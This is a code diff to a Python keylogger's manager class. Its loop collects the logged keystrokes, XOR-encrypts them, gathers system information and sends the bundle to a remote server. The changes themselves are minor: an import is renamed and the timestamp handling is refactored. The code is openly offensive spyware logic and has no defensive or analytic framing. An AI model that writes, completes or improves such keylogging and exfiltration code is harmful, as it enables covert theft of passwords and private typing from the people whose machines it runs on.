@@ -1,6 +1,6 @@
 from EncryptedXor import EncryptedXor
 from KeyLoggerService import KeyLoggerService
-from clientSide import SendData
+from networkWrier import SendData
 from datetime import datetime
 import time
 import os
@@ -23,9 +23,9 @@ class KeyLoggerManager:
            time.sleep(self.TIME)
            text =''.join(self.start.get_logged_keys())
            xor=self.xor.xor_encrypt(text,self.key)
-           now=datetime.now()
+           now=datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            data_for_system=self.start.system_information()
-           self.send_client.send_to_server({"time":now.strftime('%d/%m/%Y %H:%M:%S'),"data":xor,"system":data_for_system})
+           self.send_client.send_to_server({"time":now,"data":xor,"system":data_for_system})
            print("sent to server")
            self.start.data.clear()
 
